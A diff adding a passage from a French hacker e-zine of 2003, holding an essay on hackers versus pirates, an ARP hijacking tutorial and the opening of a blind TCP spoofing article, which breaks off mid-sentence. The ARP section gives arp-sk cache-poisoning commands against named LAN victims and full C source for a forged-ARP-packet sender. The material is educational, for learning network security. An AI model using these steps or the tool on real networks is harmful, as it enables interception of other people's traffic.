@@ -1,0 +1,2722 @@
+                   -  !!! PH34R !!!  -  
+                    Issue #1 15/01/03
+                 groslameur@caramail.com
+                            |
+    ---------------------------------------------------
+   | ~~~~~~~~~~~~~~~~~~~ Sommaire ~~~~~~~~~~~~~~~~~~~~ |
+   |              1. hackers && pirates                |
+   |                2. hijacking arp                   |
+   |            3. art of blind spoofing               |
+   |        4. how to write a buffer overflow          |
+   |         5. mise en place d'un firewall            | 
+   |          6. sécurité sous *nix && ids             |
+   |          7. faille de css sur caramail            |
+   \___________________________________________________/
+                            |
+                            |
+---------------------------------------------------------------
+I.: HACKERS && PIRATES                         Par groslameur
+---------------------------------------------------------------
+
+L'art du piratage informatique est un art bien paradoxal de 
+nos jours. Si l'on considère que l'art, par définition, est 
+un ensemble de techniques et de pratiques qui aboutissent à 
+la création d'une oeuvre, que penser de quelqu'un qui rentre 
+illégalement sur un système, en exploitant une faille connue,
+et avec pour seul but de nuire à ce système, et donc de le 
+détruire ?
+
+Les pirates actuels, ceux qui transgressent la loi Godfrain, 
+sont loins d'être des artistes... Certes, au commencement du 
+piratage informatique, on ne pouvait pas en dire autant des 
+gens comme Robert Morris, créateur du tout premier "ver", ou 
+comme Kevin Mitnick, le premier à mettre en oeuvre le "blind
+spoofing". Ces gens là ont véritablement innové en créant des
+techniques originales (bien qu'illégales).
+
+Actuellement, la situation s'inverse, les pirates sont plus 
+des destructeurs qu'autre chose, et, dans leur crise d'ados, 
+ils réclament une légalisation du piratage, à comprendre par 
+une liberté d'utiliser des vieux exploits pour phf ou phpnuke 
+afin de modifier les pages d'accueil des sites d'internautes 
+innocents. Ils osent même revendiquer une égalité totale sur 
+la toile, mais n'hésitent pas à se cracher les uns sur les 
+autres pour s'estimer être le meilleur... Ils se disent être 
+en pleine "quête de connaissances", sans doute est ce pour 
+cela qu'ils tirent partie pour la énième fois de la présence 
+d'une faille unicode sur un serveur web non patché. 
+La platitude de leurs actions tue le savoir...
+
+Pendant ce temps, d'autres moins utopistes élaborent des
+protocoles tels que le Peer-to-peer, mais ceux là sont igno-
+-rés des scripts kiddies anarchistes et sont malheuresement 
+mis dans le même sac que ceux ci. En résulte une autre pro-
+-blèmatique,l'amalgame souvent fait entre pirates et hackers.
+
+Un hacker est quelqu'un qui apporte du sang neuf à la science 
+du traitement de données automatisé, par exemple ceux qui 
+décelent des failles dans des programmes où des systèmes con-
+-nus, ceux qui pratiquent l'art du reverse engenerring (la 
+créativité par l'analyse), ceux qui travaillent constamment, 
+bénéveloment ou non, sur l'évolution ou la programmation de 
+logiciels, etc... Leur moyenne d'âge se situe par ailleurs 
+plus autour de 25 ans que de 15, et ils travaillent plutôt 
+comme ingénieurs dans des SSII que étudiants dans des facs..
+
+Un pirate, à l'heure actuelle, est comme on a vu un emmerdeur 
+qui détruit les biens d'autrui, tout en osant se proclamer 
+"hacker". On se souvient ainsi des déboires du très lammer 
+MafiaBoy qui mis à sac Yahoo en utilisant une attaque de dé-
+-nis de service, qu'on se demande même si il comprenait le 
+principe intrinsèque du smurf...
+
+Car si le hacker crée quelque chose, d'autres hackers y trou-
+-vent des failles et une multitude de lammers les exploitent..
+Certes, c'est une vision comme une autre, mais elle a le mé-
+-rite de ne pas être le reflet d'un rapprochement poncif qu'
+on se fait, de nos jours, entre pirate informatique et hacker.
+
+Cependant nous sommes bien d'accord ; le sens initial du mot
+"hacker" est pirate informatique, et ce n'est pas une défi-
+-nition péjorative, ce sont les scripts-kiddies qui terni-
+-ssent cette définition.
+
+Pour devenir un hacker, il vous faut être autodidacte, sa-
+-voir programmer, connaître les protocoles associés à 
+L'Internet, et bien sûr connaître le fonctionnement de son
+pc ainsi que du système d'exploitation qui l'occupe... 
+C'est pour cette dernière raison que les hackers préférent
+travailler sur des systèmes dits "open-sources" (ou les
+sources du noyau du système d'exploitation sont libres, 
+c'est à dire lisibles gratuitement et sans droit déposé).
+
+Que les choses soient donc claires, le but de cet e-mag n'est 
+pas de faire de vous un pirate ou ni même un hacker, mais de 
+vous donner la possibilité d'approfondir vos connaissances 
+dans le domaine de la sécurité informatique. La compréhen-
+-sion des textes qui vont suivre nécessite des bases de 
+programmation (C && Asm X86) ainsi que de réseaux (tcp/ip). 
+
+
+
+      Jean-Kevin, passe ton chemin ;)
+
+
+
+
+
+
+
+
+
+
+---------------------------------------------------------------
+II.: HIJACKING ARP                             Par groslameur
+---------------------------------------------------------------
+
+
+[ Presentation du protocole ARP ]
+
+Le protocole ARP est utilié pour faire la correspondance en-
+-tre adresses physiques (adresses MAC) et adresses logiques 
+(adresses IP) sur un réseau LAN, reposant sur le protocole 
+Ethernet. Les adresses MAC s'écrivent sur 6 octets, dont les 
+3 premiers identifient le constructeur et les trois suivants 
+identifient la machine.
+
+Voici un shéma représentant une trame Ethernet :
+
+
+      (6)             (6)          (2)     ( 46 < x < 1500)     (4)
+<-------------><-------------><------><--------------------><----->
+'-----------------------------------------------------------------'
+| dest adress | source adress | type  | données  | bourrage | CRC |
+'-----------------------------------------------------------------'
+
+
+Par ailleurs la structure définissant cette trame se trouve dans 
+le fichier /usr/include/ethernet.h :
+
+
+struct ether_header
+{
+  u_int8_t  ether_dhost[ETH_ALEN];	/* destination eth addr	*/
+  u_int8_t  ether_shost[ETH_ALEN];	/* source ether addr	*/
+  u_int16_t ether_type;		      /* packet type ID field */
+} __attribute__ ((__packed__));
+
+
+
+Les dhost et shost address représentent les adresses MAC sources 
+et de destination.
+
+Les différents types de trame, quand à eux, sont ceux ci 
+(extrait de /usr/include/ethernet.h) :
+
+
+#define	ETHERTYPE_PUP    0x0200    /* Xerox PUP */
+#define	ETHERTYPE_IP     0x0800    /* IP */
+#define	ETHERTYPE_ARP    0x0806    /* Address resolution */
+#define	ETHERTYPE_REVARP 0x8035	    /* Reverse ARP */
+
+#define	ETHER_ADDR_LEN  ETH_ALEN   /* size of ethernet addr */
+#define	ETHER_TYPE_LEN  2          /* bytes in type field */
+#define	ETHER_CRC_LEN   4          /* bytes in CRC field */
+#define	ETHER_HDR_LEN   ETH_HLEN   /* total octets in header */
+#define	ETHER_MIN_LEN  (ETH_ZLEN + ETH_CRC_LEN) /* min length */
+#define	ETHER_MAX_LEN  (ETH_FRAME_LEN + ETH_CRC_LEN) /* max l.*/
+
+
+
+Pour connaître son adresse MAC, on fera appel à la commande 
+"ifconfig -a" sous linux et "ipconfig /all" sous windows. Vous 
+constaterez que les adresses physiques sont écrites sous la 
+forme xx:xx:xx:xx:xx:xx, sachez que FF:FF:FF:FF correspond à 
+une machine broadcast.
+
+Le principe d'un réseau Ethernet est très simple. Lorsqu'une 
+trame est émise sur un réseau, toutes les machines la reçoi-
+-vent, ces machines vont ensuite comparer l'adresse MAC de 
+leur carte réseau avec l'adresse de destination de la trame, 
+si il y'a correspondance, alors le paquet est lu. Notre ob-
+-jectif va donc être de détourner ces trames, on pourrait bien 
+sûr penser à utiliser un outil tel que TCPdump pour capturer 
+les données transitant sur le réseau, en passant sa carte en 
+mode promiscuous (tous les paquets sont lisibles par la carte, 
+même ceux qui ne lui sont pas destinés), mais cette technique 
+sera assez limitée, étant donné qu'il ne s'agira pas de de-
+-tourner le trafic sortant ou entrant d'une machine définie, 
+mais de sniffer l'intégrité des trames de toutes machines (et 
+encore, notre portée d'écoute risquera d'être très limitée), 
+ce qui nous servira peu dans le cas d'un hijacking...
+
+
+Revenons maintenant à ARP, comme on l'a vu, il servira, a par-
+-tir d'une adresse IP, à retrouver l'adresse MAC de la machi-
+-ne. Il existe également une "variante", RARP (Reverse-ARP), 
+qui elle, offre le moyen de retrouver une adresse IP à partir 
+d'une adresse MAC sur un réseau LAN.
+
+Voilà maintenant le shéma d'une trame ARP/RARP :
+
+
+'-----------------------------------------------'
+|           Type d'équipement (16b)             |
+'-----------------------------------------------'
+|        Identifiant de protocole (16b)         |
+'-----------------------------------------------'
+|  Longueur de (8b)     |   Longueur de (8b)    |
+|  l'adresse physique   |   l'adresse logique   |
+'-----------------------------------------------'
+|               Opération  (16b)                |
+'-----------------------------------------------'
+|     Adresse logique de l'expéditeur (32b)     |
+'-----------------------------------------------'
+|   Adresse physique du recepteur (variable)    |
+'-----------------------------------------------'
+|     Adresse logique du recepteur (32b)        |
+'-----------------------------------------------'
+
+
+Le type d'équipement désigne le type de matériel à employer, 
+dans notre cas, sa valeur sera fixée à 1 (Ethernet). L'identi-
+-fiant de protocole désigne le protocole à utiliser et l'opé-
+-ration désigne l'opération que doit utiliser le message, 1 
+correspond à une requète ARP, 2 à une réponse ARP, 3 à une 
+requète RARP, et 4 à une réponse RARP. Au cas ou vous auriez 
+du mal à cerner les autres champs, je vous rapelle que l'on 
+désigne une adresse logique par une adresse IP, et une ad-
+-resse physique par une adresse MAC.
+
+A noter que ARP posède un mécanisme de cache, qui permet de 
+sauvegarder correspondances IP/MAC dans une table, consultable 
+par la commande "arp -a" (tout OS confondus).
+
+Voici un petit exemple :
+
+
+[kefka] $ arp -a
+ultimecia (192.168.239.2) at 44:44:44:DE:6a:34 [ether] on eth0
+
+
+Ainsi, pour la carte réseau de kefka@hackzine, une correspon-
+-dance entre l'adresse logique et l'adresse physique de ulti-
+-mecia est établie, kefka peut donc envoyer des trames à 
+ultimecia. Pour rajouter une entrée dans notre table, on en-
+-verra une requète à la machine avec laquelle nous souhaitons 
+communiquer, et dont nous ne connaissons pas l'adresse MAC.
+
+
+[ Détournement de trames ]
+
+Passons aux choses proprement dites... Notre but va être de 
+détourner les trames d'une machine quelconque sur un LAN, 
+on pourrait tout d'abord penser à mettre en oeuvre des
+techniques de sniffing, comme on l'a vu dans le petit a), 
+le sniffing présente des inconvénients, ou de spoofing :
+
+
+1/ Mac Spoofing
+
+Les commutateurs Ethernet disposent d'une table apellée 
+CAM, contenant pour chaque port eth* les adresses MAC des 
+machines connectées. Le MAC spoofing va consister à se ser-
+-vir d'un mécanisme de mise à jour de cette table, ainsi si 
+nous envoyons une trame ethernet dont l'adresse source est 
+l'adresse physique de la victime, et l'adresse de destina-
+-tion notre propre adresse physique, le commutateur va met-
+-tre à jour sa table en établissant une correspondance 
+entre l'adressse MAC de la victime et notre port eth*.
+
+Pour envoyer nos trames, nous pourrons par exemple utiliser 
+le programme arp-sk,telechargable sur http://www.arp-sk.org.
+
+Et voici un petit exemple, au cas ou notre machine (kefka) 
+serait désireuse d'intercepter le trafic entrant sur la 
+machine ultimecia :
+
+
+Représentation de la CAM :
+
+Port |  Adresse MAC
+-------------------
+1    | 44:44:44:11:4d:88                   // kefka
+2    | 44:44:44:DE:6a:34                   // ultimecia
+3    | 02:54:44:d8:6e:3f                   // orbital
+4    | 45:54:55:ED:4e:Fe                   // bahamut
+
+
+[kefka] $ arp-sk -w -d kefka -s ultimecia
+
+
+Représentation de la nouvelle CAM
+
+Port |  Adresse MAC
+-------------------
+1    | 44:44:44:11:4d:88; 44:44:44:DE:6a:34    // kefka, ultimecia
+2    |
+3    | 02:54:44:d8:6e:3f                       // orbital
+4    | 45:54:55:ED:4e:Fe                       // bahamut
+
+
+En clair, désormais si une machine tente de communiquer à 
+notre victime, nous pourrons intercepter cette communica-
+-tion. Un inconvénient majeur de cette technique est que, 
+si la victime essaye d'envoyer des trames, le commutateur 
+ne saura plus ou donner de la tête, il ne pourra pas asso-
+-cier la même adresse MAC à deux ports différents, l'idéal
+serait donc de déconnecter la victime, en utilisant une 
+attaque de refus de service (DOS), ce qui serait trop peu 
+discret à mettre en oeuvre... Autre problème, les trames 
+envoyées des machines à notre victime ne seront pas reçues
+par celle-ci, mais par notre machine uniquement, l'écoute 
+de connexion sera donc impossible.
+
+
+Le sniffing et le spoofing n'étant pas fonctionnels, que 
+reste il ? La meilleure solution, serait directement d'aller 
+corrompre le cache ARP de notre victime, c'est à dire réu-
+-ssir à rajouter une entrée dans la table d'une machine. 
+
+
+2/ ARP Cache Poisonning
+
+Pour ajouter une entrée dans le cache ARP de notre victi-
+-me, nous utiliserons tout simplement une faiblesse dans 
+la mise à jour de la table ARP. Lorsqu'une machine reçoit 
+une requète ARP (à travers un ping comme on l'a vu tout à 
+l'heure), cette machine va lire l'adresse physique source 
+et l'adresse logique source de la requète ARP, et ajouter 
+une entrée dans son cache.
+
+L'idéal va donc être de mystifer notre adresse IP source 
+sur celle d'une potentielle victime, et d'envoyer une re-
+-quète ARP contenant cette IP dans le champ adresse logi-
+-que source, et contenant notre adresse physique dans le 
+champ adresse physique source, à une machine cible. Dès 
+lors, quand cette machine essaiera d'envoyer un paquet à 
+notre victime, ce paquet sera redirigé vers notre propre
+machine.
+
+Mais voici un exemple plus concret. Je (kefka) désire crée 
+une entrée dans le cache ARP de ultimecia, associant ainsi 
+mon adresse MAC à celle de ma victime, orbital. Pour cela
+j'envoie une requète ARP dont le champs adresse physique 
+source contient mon adresse MAC, le champs adresse logique 
+source celle d'orbital, à ultimecia. Nous enverrons notre
+requète en unicast (option -d), afin qu'elle ne puisse être 
+vue uniquement par notre recepteur (ultimecia).
+
+
+# Cache ARP d'ultimecia avant mise à jour:
+[ultimecia] $ arp -a
+bahamut (192.168.239.4) at 45:54:55:ED:4e:Fe
+
+[kefka] $ arp-sk -w -d ultimecia -S orbital -D ultimecia
++ Running mode "who-has"
++ IfName: eth0
++ Source MAC: 44:44:44:11:4d:88
++ Source ARP MAC: 44:44:44:11:4d:88
++ Source ARP IP : 192.168.239.3 (orbital)
++ Target MAC: 44:44:44:DE:6a:34
++ Target ARP MAC: 00:00:00:00:00:00
++ Target ARP IP : 192.168.239.2 (ultimecia)
+(......)
+
+# Cache ARP d'ultimecia après mise à jour:
+[ultimecia] $ arp -a
+orbital (192.168.239.3) at 44:44:44:11:4d:88
+bahamut (192.168.239.4) at 45:54:55:ED:4e:Fe
+
+
+Résultat : Nous avons pu associer notre adresse physique 
+à l'adresse logique d'orbital dans le cache ARP d'ultimecia, 
+désormais toutes les trames envoyées par ultimecia à orbital 
+seront interceptées par nos soins... On pourra par la suite, 
+bien sûr, rediriger les trames interceptées à orbital, dans 
+le but de ne laisser planer aucun soupçon, on pourra par e-
+-xemple utiliser la fonction REDIRECT du pare-feu filtre de 
+paquet iptable, intégré au kernel (voir article sur le fi-
+-rewalling pour plus d'infos ;).
+
+
+
+
+/*
+
+    sendarp.c
+
+    Modified by Jonathan R. Seagrave <jrs@abiogenesis.com> 14 Sep 00
+
+    Based on code from Yuri Volobuev <volobuev@t1.chem.umn.edu>
+
+    This program sends out one ARP packet with source/target IP and Ethernet
+    hardware addresses suuplied by the user.  It compiles and works on Linux
+    and will probably work on any Unix that has SOCK_PACKET.
+
+    The idea behind this program is a proof of a concept, nothing more.  It
+    comes as is, no warranty.  However, you're allowed to use it under one
+    condition: you must use your brain simultaneously.  If this condition is
+    not met, you shall forget about this program and go RTFM immediately.
+
+    yuri volobuev'97
+    volobuev@t1.chem.umn.edu
+*/
+
+#include <stdio.h>
+#include <ctype.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <netdb.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <linux/if_ether.h>
+#include <getopt.h>
+
+#define ETH_HW_ADDR_LEN 6
+#define IP_ADDR_LEN 4
+#define ARP_FRAME_TYPE 0x0806
+#define ETHER_HW_TYPE 1
+#define IP_PROTO_TYPE 0x0800
+
+#define DEBUG 1
+
+char usage[] = {"sendarp: send an arp packet\n\
+    usage: sendarp [-?] [-v] [-t message_type] [-i interface]\n\
+                   [-p sender_protocol_address] [-P target_protocol_address]\n\
+                   [-h sender_hardware_address] [-H target_hardware_address] [-v]\n\
+\n\
+    -?    display this message
+\n\
+    -v    verbose                         Default: not verbose\n\
+              Be verbose\n\
+\n\
+    -t    message type               Default: 1\n\
+              Identifies the purpose for this ARP packet\n\
+              1    ARP Request\n\
+              2    ARP Response\n\
+              3    Reverse ARP Request\n\
+              4    Reverse ARP Response\n\
+              8    Inverse ARP Request\n\
+              9    Inverse ARP Response\n\
+\n\
+    -i    interface                       Default: eth0\n\
+              Select an interface (eth1, lo, ppp0, whatever...)\n\
+\n\
+    -p    sender protocol address         Default: 0.0.0.0\n\
+              Identifies the ip address of the system issuing the ARP packet.\n\
+\n\
+    -P    target protocol address         Default: 0.0.0.0\n\
+              Identifies the ip address of the ARP packet's destination.\n\
+\n\
+    -h    sender hardware address         Default: 00:00:00:00:00:00\n\
+              Identifies the hardware address of the system issuing the ARP packet.\n\
+\n\
+    -H    target hardware address    Default: 00:00:00:00:00:00\n\
+              Identifies the hardware address of the ARP packet's destination.\n\
+\n\
+    Bugs:\n\
+          if you find any please email <jrs@abiogenesis.com>\n\
+              thanks.
+\n\
+    Author(s):\n\
+          Derived from send_arp.c by Yuri Volobuev <volobuev@t1.chem.umn.edu> 1997\n\
+          Modified by Jonthan R. Seagrave <jrs@abiogenesis.com> 14 Sep 2000\n\
+\n"};
+
+struct arp_packet {
+        u_char dst_hw_addr[ETH_HW_ADDR_LEN];
+        u_char src_hw_addr[ETH_HW_ADDR_LEN];
+        u_short frame_type;
+        u_short hw_type;
+        u_short prot_type;
+        u_char hw_addr_size;
+        u_char prot_addr_size;
+        u_short type;
+        u_char sndr_hw_addr[ETH_HW_ADDR_LEN];
+        u_char sndr_ip_addr[IP_ADDR_LEN];
+        u_char rcpt_hw_addr[ETH_HW_ADDR_LEN];
+        u_char rcpt_ip_addr[IP_ADDR_LEN];
+        u_char padding[18];
+};
+
+void send_arp(char *src_ip, char *src_hw_addr, char *dst_ip, char *dst_hw_addr, char *interface, u_short type);
+void die(char *);
+void get_ip_addr(struct in_addr*,char*);
+void get_hw_addr(char*,char*);
+
+int main (int argc,char** argv) {
+
+    char src_hw_addr[32];
+    char dst_hw_addr[32];
+    char src_ip[32];
+    char dst_ip[32];
+    char interface[32];
+    u_short type = 1;
+    char *arg;
+    u_short verbose = 0;
+    int i = 1;
+    u_short help = 0;
+
+    strcpy(src_hw_addr, "00:00:00:00:00:00");
+    strcpy(dst_hw_addr, "00:00:00:00:00:00");
+    strcpy(src_ip, "0.0.0.0");
+    strcpy(dst_ip, "0.0.0.0");
+    strcpy(interface, "eth0");
+
+    if (argc <= 1) help = 1;
+
+    while (arg = argv[i]) {
+        i++;
+
+        if (strcmp("-i", arg) == 0) {
+            strncpy(interface, argv[i++], 31);
+        } else if (strcmp("-p", arg) == 0) {
+            strncpy(src_ip, argv[i++], 31);
+        } else if (strcmp("-P", arg) == 0) {
+            strncpy(dst_ip, argv[i++], 31);
+        } else if (strcmp("-h", arg) == 0) {
+            strncpy(src_hw_addr, argv[i++], 31);
+        } else if (strcmp("-H", arg) == 0) {
+            strncpy(dst_hw_addr, argv[i++], 31);
+        } else if (strcmp("-v", arg) == 0) {
+            verbose = 1;
+        } else if (strcmp("-t", arg) == 0) {
+            arg = argv[i++];
+            if (strcmp("1", arg) == 0) type = 1;
+            else if (strcmp("2", arg) == 0) type = 2;
+            else if (strcmp("3", arg) == 0) type = 3;
+            else if (strcmp("4", arg) == 0) type = 4;
+            else if (strcmp("8", arg) == 0) type = 8;
+            else if (strcmp("9", arg) == 0) type = 9;
+        } else {
+            help = 1;
+        }
+    }
+
+    if (help) printf("%s", usage);
+
+    if (verbose) {
+        printf("Sending ARP Packet:\n");
+        printf("    Interface:                %s\n", interface);
+        printf("    Message type:             %d\n", type);
+        printf("    Sender hardware address:  %s\n", src_hw_addr);
+        printf("    Sender protocol address:  %s\n", src_ip);
+        printf("    Target hardware address:  %s\n", dst_hw_addr);
+        printf("    Target protocol address:  %s\n", dst_ip);
+    }
+
+    send_arp(src_ip, src_hw_addr, dst_ip, dst_hw_addr, interface, type);
+
+    exit (0);
+}
+
+void send_arp(char *src_ip, char *src_hw_addr, char *dst_ip, char *dst_hw_addr, char *interface, u_short type){
+
+    struct in_addr src_in_addr,dst_in_addr;
+    struct arp_packet pkt;
+    struct sockaddr sa;
+    int sock;
+
+    sock=socket(AF_INET,SOCK_PACKET,htons(ETH_P_RARP));
+    if(sock<0){
+        perror("socket");
+        exit(1);
+    }
+
+    pkt.frame_type = htons(ARP_FRAME_TYPE);
+    pkt.hw_type = htons(ETHER_HW_TYPE);
+    pkt.prot_type = htons(IP_PROTO_TYPE);
+    pkt.hw_addr_size = ETH_HW_ADDR_LEN;
+    pkt.prot_addr_size = IP_ADDR_LEN;
+    pkt.type=htons(type);
+
+    get_hw_addr(pkt.src_hw_addr, "ff:ff:ff:ff:ff:ff");
+    get_hw_addr(pkt.dst_hw_addr, "ff:ff:ff:ff:ff:ff");
+    get_hw_addr(pkt.sndr_hw_addr, src_hw_addr);
+    get_hw_addr(pkt.rcpt_hw_addr, dst_hw_addr);
+
+    get_ip_addr(&src_in_addr, src_ip);
+    get_ip_addr(&dst_in_addr, dst_ip);
+
+    memcpy(pkt.sndr_ip_addr,&src_in_addr,IP_ADDR_LEN);
+    memcpy(pkt.rcpt_ip_addr,&dst_in_addr,IP_ADDR_LEN);
+
+    bzero(pkt.padding,18);
+
+    strcpy(sa.sa_data, interface);
+
+    if(sendto(sock,&pkt,sizeof(pkt),0,&sa,sizeof(sa)) < 0){
+        perror("sendto");
+        exit(1);
+    }
+    exit(0);
+}
+
+void die(char* str){
+    fprintf(stderr,"%s\n",str);
+    exit(1);
+}
+
+void get_ip_addr(struct in_addr* in_addr,char* str){
+
+    struct hostent *hostp;
+
+    in_addr->s_addr=inet_addr(str);
+    if(in_addr->s_addr == -1){
+        if( (hostp = gethostbyname(str)))
+            bcopy(hostp->h_addr,in_addr,hostp->h_length);
+        else {
+            fprintf(stderr,"send_arp: unknown host %s\n",str);
+            exit(1);
+        }
+    }
+}
+
+void get_hw_addr(char* buf,char* str){
+
+    int i;
+    char c,val;
+    char hw_addr[64];
+
+    strcpy (hw_addr, str);
+
+    for(i=0;i<ETH_HW_ADDR_LEN;i++){
+        if( !(c = tolower(*str++))) {
+            char msg[64];
+            sprintf(msg, "Invalid hardware address: %s", hw_addr);
+            die(msg);
+        }
+        if(isdigit(c)) val = c-'0';
+        else if(c >= 'a' && c <= 'f') val = c-'a'+10;
+        else {
+            char msg[64];
+            sprintf(msg, "Invalid hardware address: %s", hw_addr);
+            die(msg);
+        }
+
+        *buf = val << 4;
+        if( !(c = tolower(*str++))) die("Invalid hardware address");
+        if(isdigit(c)) val = c-'0';
+        else if(c >= 'a' && c <= 'f') val = c-'a'+10;
+        else {
+            char msg[64];
+            sprintf(msg, "Invalid hardware address: %s", hw_addr);
+            die(msg);
+        }
+
+        *buf++ |= val;
+
+        if(*str == ':')str++;
+    }
+}
+
+
+
+[-EOF]
+
+
+
+
+
+
+
+
+
+
+---------------------------------------------------------------
+III.: ART OF BLIND SPOOFING                    Par groslameur
+---------------------------------------------------------------
+
+
+     1.0 Introduction
+     1.1 Modèle OSI
+     1.2 Présentation de TCP
+     1.3 Connection TCP
+     2.0 Principes du Blind Spoofing
+     2.1 Protocole Rlogin
+     2.2 Mise en application
+     2.3 SYN Flooding
+     2.4 Prédiction de l'ISN
+     2.5 Infiltration
+     3.0 Conclusion
+     Annexe: forgeur de paquets TCP (TCPforger.c)
+
+
+
+Le Blind Spoofing immortalisé en 1994 par le feu Kevin 
+Mitnick à l'insu de Tsutomu Shimomura, est une technique 
+de spoofing (pratique qui consiste à envoyer des paquets 
+spoofés - dont l'adresse IP source est celle d'une autre
+machine, existante ou non - à un hôte, à des fins plus ou 
+moins légales..) qui se base sur des relations de confi-
+-ance entre deux machines (système des fichiers .rhost).
+  
+Au niveau du modèle OSI (modèle qui définit l'organisation 
+de tcp/ip dans les stack des systèmes d'exploitation), le 
+blind spoofing se place au niveau de la couche application, 
+car il consiste en réalité à utiliser des des applications 
+telles que rlogin ou rsh, et utilise les informations des 
+couches inférieures, nottament celles de la couche Transport:
+
+
+    _  *---------------------------*
+   /|\ |     Couche Application    |-----> Blind Spoofing
+ E  |  |---------------------------|          - rlogin
+ N  |  |    Couche Présentation    |          - rsh , ...
+ C  |  |---------------------------|
+ A  |  |      Couche Session       |
+ P  |  |---------------------------|
+ S  |  |     Couche Transport      |-----> TCP Spoofing
+ U  |  |---------------------------|          - tcp
+ L  |  |       Couche Réseau       |-----     - udp, ...
+ A  |  |---------------------------|     \
+ T  |  | Couche Liaison de Données |      ---> IP Spoofing
+ I  |  |---------------------------|             - ip
+ O  |  |      Couche Physique      |             - icmp, ...
+ N  |  *---------------------------*
+
+
+Pour pouvoir réaliser un blind spoofing, nous devrons donc 
+agir au niveau de la couche Transport, plus précisément au 
+niveau du protocole TCP (Transport Control Protocol). 
+
+TCP est un protocole qui offre des services supplémentaires 
+à IP (mécanisme send and pray), permettant ainsi un canal 
+full-duplex fiable entre deux hôtes, du fait de la gestion 
+du checksum, des numéros de séquence, des flags, du fait 
+qu'il s'agit d'un protocole de type sliding-windows 
+(fenêtre glissante), etc... La figure suivante illustre 
+la composition d'un entête de paquet TCP:
+
+
+             (16 bits)                       (16 bits)
+<-----------*--------------¤------------*------------->
+*-----------------------------------------------------*
+|                   Source IP Adress                  |
+|-----------------------------------------------------|
+|                 Destination IP Adress               |
+|-----------------------------------------------------|
+|  8 b of 0  |   Prot. ID  |       TCP Lenght         |
+|-----------------------------------------------------|
+|-----------------------------------------------------|
+|        Source Port       |     Destination Port     |
+|-----------------------------------------------------|
+|                    Sequence Number                  |
+|-----------------------------------------------------|
+|                 Acknowledgment Number               |
+|-----------------------------------------------------|
+| Data offs. | R. | Flags  |         Window           |
+|-----------------------------------------------------|
+|         Checksum         |      Urgent Pointer      |
+|-----------------------------------------------------|
+|                 Options                |  Padding   |
+*-----------------------------------------------------*
+
+
+Les deux traits horizontaux symbolisent tout simplement 
+la séparation entre le pseudo entête TCP, ou entête IP 
+(en haut) et l'entête de segment TCP.
+
+
+Quelques précisions maintenant: 
+
+- Le champ Protocol ID doit contenir le numéro du 
+protocole de couche supérieure, en l'occurence TCP 
+(dont l'identifiant est 6).
+
+- Le champ Flag(s), les flags TCP sont au nombre de 6:
+                    * SYN: synchronisation
+                    * ACK: ackowledgment
+                    * FIN: no more data from server
+                    * RST: reset the connexion
+		    * URG: urgent pointer
+                    * PSH: push fonction
+Ces flags fonctionnent de la manière suivante: 1/activé 
+&& 2/désactivé)
+
+- Le champ Urgent Pointer contiendra des données 
+urgentes à interpréter uniquement si le flag URG 
+est à 1.
+
+- Le numéro de séquence identifie la position du flux 
+de données, et permet donc le réassemblage des paquets 
+arrivés à destination. Si le flag SYN est à 0, le numéro 
+de séquence sera celui du premier octet de données du 
+segment. Si le flag SYN est à 1, il s'agira de l'ISN 
+(numéro de séquence initial) et le premier octet de 
+données sera à ISN+1.
+
+- Le champ Acknowledgment contiendra le numéro de 
+séquence attendu par l'émetteur du segment si le flag 
+ACK est à 1.
+
+- Le checksum ou somme de contrôle qui va vérifier la 
+validité de l'entête. En C, nous utiliserons cette 
+fonction générique pour le calcul du checksum:
+
+
+unsigned short in_cksum(unsigned short *addr, int len)
+{
+ register int sum = 0;
+ u_short answer = 0;
+ register u_short *w = addr;
+ register int nleft = len;
+
+ while (nleft > 1)
+   {
+   sum += *w++;
+   nleft -= 2;
+   }
+  if (nleft == 1)
+     {
+     *(u_char *) (&answer) = *(u_char *) w;
+     sum += answer;
+     }
+   sum = (sum >> 16) + (sum & 0xffff);
+   sum += (sum >> 16);
+   answer = ~sum;
+ return (answer);
+}
+
+
+- Le champ Window fait référence au concept de fenêtre gli-
+-ssante (sliding window). On appelle en réalité fenêtre le 
+nombre maximal de paquets que l'émetteur peut transmettre 
+sans reçevoir d'acquittement (paquet ACK). Sa taille sera 
+généralement fixée à 4, autrement dit l'utilisateur pourra 
+envoyer 4 paquets simultanément.
+
+- Si quelques autres points vous paraissent obscurs, revo-
+-yez les grands principes de la communication client/serveur.
+
+Une connection full-duplex entre deux machines se traduit 
+au niveau de la couche Transport par ce que l'on appelle 
+"Three-Ways Handshake TCP" (triple poignée de mains TCP). 
+Vous l'aurez compris, cette appellation laisse supposer 
+une connection en trois mouvements. Ainsi si l'on suppose 
+une machine client A désireuse de se connecter à une ma-
+-chine serveur B, le schéma de la connection sera celui-ci:
+
+
+(1) A ----- SYN ------> B      seq num -> ISN(A)
+(2) A <--- SYN/ACK ---- B      seq num -> ISN(B) ; ack num -> ISN(A)+1
+(3) A ------ ACK -----> B      ack num -> ISN(B)+1
+
+
+La demande de connection du client au serveur s'effectue 
+en (1), cela se traduit par l'envoi d'un segment TCP dans 
+lequel A place son ISN et ayant le flag SYN à 1. Un paquet 
+ayant les flags SYN et ACK à 1 est alors envoyé par le ser-
+-veur au client, le flag SYN signifiant que le serveur est 
+en train de synchroniser les numéros de séquence et donc 
+place son ISN dans le segment envoyé, et le flag ACK repré-
+-sentant l'accusé de reception de la demande de connexion. 
+A cet instant le numéro ACK est égal à ISN(A)+1 ce qui co-
+-rrespond au numéro d'ordre du prochain octet de données
+que le serveur est pret à reçevoir. Le client va donc pou-
+-voir communiquer avec le serveur à partir de ce moment 
+précis, avant cela il va envoyer un paquet ACK en signe 
+d'acquittement et possèdant l'ISN de B incrémenté (étape 
+(3). Ceci fait, les numéros de séquence sont synchronisés 
+et la communication peut enfin commencer.
+
+Cette parenthèse sur le protocole TCP étant terminée, nous 
+allons maintenant nous attaquer à la compréhension du pro-
+-tocole Rlogin. Le service rlogin devrait être présent dans 
+tous les /etc/inetd.conf des machines de type UNIX, géné-
+-ralement désactivé. Pour les besoins de la démonstration 
+nous activerons bien sûr rlogin.
+
+Pour ce faire il nous suffira de redémarrer le tcp-wrapper 
+inetd ou xinetd après avoir pris soin d'enlever le "#" de-
+-vant le service rlogin:
+
+
+$ killall inetd
+
+
+Ceci fait, voyons notre rlogin de plus près... Le daemon 
+rlogin tourne sur le port 513 et permet un shell distant 
+entre un client et un serveur, le tout utilisant le méca-
